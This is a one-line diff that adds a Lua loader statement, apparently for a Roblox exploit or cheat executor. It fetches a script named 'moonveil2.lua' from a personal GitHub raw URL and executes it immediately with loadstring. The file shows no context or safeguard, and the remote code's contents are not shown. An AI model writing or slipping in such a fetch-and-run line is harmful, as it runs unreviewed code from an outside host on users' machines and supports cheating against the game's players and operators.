@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ikzzz1444/Script/refs/heads/main/moonveil2.lua"))()
